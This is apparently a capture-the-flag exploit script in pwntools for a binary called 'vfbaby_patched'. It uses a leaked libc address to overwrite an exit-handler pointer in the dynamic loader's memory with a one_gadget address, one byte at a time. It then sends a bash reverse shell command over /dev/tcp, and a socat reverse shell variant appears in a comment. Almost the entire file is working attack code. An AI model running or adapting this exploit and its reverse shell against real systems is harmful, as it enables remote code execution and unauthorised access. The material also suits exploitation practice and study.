#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('vfbaby_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*__run_exit_handlers+230
        # b*exit
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('0', 1337)
else:
    p = process([exe.path])
# GDB()

# exit+16
#__run_exit_handlers+230
# +106 __run_exit_handlers
"""
95 --> 269
"""
p.recvuntil(b'gift ')
libc_leak = int(p.recvuntil(b',', drop = True), 16)
libc.address = libc_leak - 0xcc230
info(f'libc leak: {hex((libc_leak))}')
info(f'libc base: {hex((libc.address))}')

one_gadget = 0xf02a4 + libc.address
rtld = libc.address  + 0x626f48

load = flat(
    rtld,
    p8(one_gadget & 0xff),

    rtld + 1,
    p8((one_gadget >> 8) & 0xff),

    rtld + 2,
    p8((one_gadget >> 16) & 0xff),


    rtld + 3,
    p8((one_gadget >> 24) & 0xff),


    rtld + 4,
    p8((one_gadget >> 32) & 0xff),


)
pause()

"""
Create local host: nc -lvnp 3636
"""

sl(load + b"bash -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'" )
# socat TCP:127.0.0.1:1337 EXEC:/bin/sh
# + b"bash -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'" 
# import time
# time.sleep(0.1)
# docker run -d -p 1337:1337 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined your_image_name
# p (int) dup2(0, 1)
# set follow-fork-mode child

p.interactive()
